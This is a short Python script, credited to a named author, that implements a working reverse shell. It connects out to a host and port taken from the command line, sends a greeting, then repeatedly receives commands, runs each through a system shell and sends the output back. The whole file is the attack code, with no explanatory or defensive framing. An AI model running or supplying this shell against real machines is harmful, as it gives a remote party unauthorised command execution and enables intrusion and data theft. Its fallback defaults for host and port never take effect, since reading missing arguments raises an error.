#! /usr/bin/python

# -----------------------------------------------------------------------------------------------------------------------------
# GENERAL
# -----------------------------------------------------------------------------------------------------------------------------
#
# author: Sebastiaan Van Hoecke
# mail: sebastiaan@sevaho.io
#
# NOTE:
#
# -----------------------------------------------------------------------------------------------------------------------------

import socket
import sys
import subprocess


if sys.argv[1]:
    target_host = sys.argv[1]
else:
    target_host = "127.0.0.1"

if sys.argv[2]:
    target_port = int(sys.argv[2])
else:
    target_port = 9000


def reverse_shell ():

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client.connect((target_host, target_port))

    client.send(b"Give it to me baby!")

    while True:
        response = client.recv(4096)
        cmd_output = subprocess.check_output(response, shell=True)
        client.send(cmd_output)
        print(response)


reverse_shell()
